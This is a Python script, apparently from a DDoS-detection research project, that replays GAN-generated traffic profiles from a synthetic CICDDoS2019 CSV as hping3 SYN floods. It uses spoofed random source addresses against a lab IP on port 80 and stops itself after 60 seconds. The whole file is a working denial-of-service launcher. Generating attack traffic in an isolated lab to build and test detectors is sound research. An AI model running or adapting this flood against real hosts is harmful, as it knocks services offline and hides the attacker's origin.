import pandas as pd
import subprocess
import os
import signal
import sys
import time

# 1. Konfigurasi
CSV_FILE = "/opt/gandd-research/data/raw/synthetic_cicddos2019.csv"
TARGET_IP = "192.168.100.100"
DURASI_SERANGAN = 60  # Serangan berhenti otomatis setelah 60 detik
df = pd.read_csv(CSV_FILE)

active_processes = []
start_time = time.time()

def stop_attack(sig=None, frame=None):
    """Fungsi bersih-bersih saat keluar"""
    print("\n\n🛑 Menghentikan semua engine hping3...")
    for p in active_processes:
        p.terminate()
    
    # Memastikan tidak ada hping3 'zombie'
    os.system("sudo pkill hping3")
    print(f"✅ Serangan selesai. Total durasi: {int(time.time() - start_time)} detik.")
    sys.exit(0)

# PERBAIKAN DI SINI: signal.SIGINT (modul.konstanta)
signal.signal(signal.SIGINT, stop_attack)

print(f"🚀 Menyerang {TARGET_IP} selama {DURASI_SERANGAN} detik...")
print("Tekan CTRL+C jika ingin berhenti lebih awal.\n")

try:
    for index, row in df.iterrows():
        # Cek apakah waktu sudah habis (Auto-Stop)
        if time.time() - start_time > DURASI_SERANGAN:
            print("\n⏰ Waktu pengujian habis!")
            break
            
        size = int(row['Fwd Packet Length Max'])
        
        # Eksekusi hping3
        cmd = [
            "sudo", "hping3", 
            "-S", "-p", "80", 
            "-d", str(size), 
            "-c", "2000", # Kirim 2000 paket per profil
            "--flood", 
            "--rand-source", 
            TARGET_IP
        ]
        
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
        
        # Jaga agar jumlah proses background tetap efisien (max 3 batch)
        if len(active_processes) > 3:
            old_proc = active_processes.pop(0)
            old_proc.wait()

        if index % 5 == 0:
            elapsed = int(time.time() - start_time)
            print(f"⏱️  [{elapsed}s] Mengirim profil GAN baris ke-{index} (Size: {size})")

    # Panggil fungsi stop setelah loop selesai atau waktu habis
    stop_attack()

except KeyboardInterrupt:
    stop_attack()
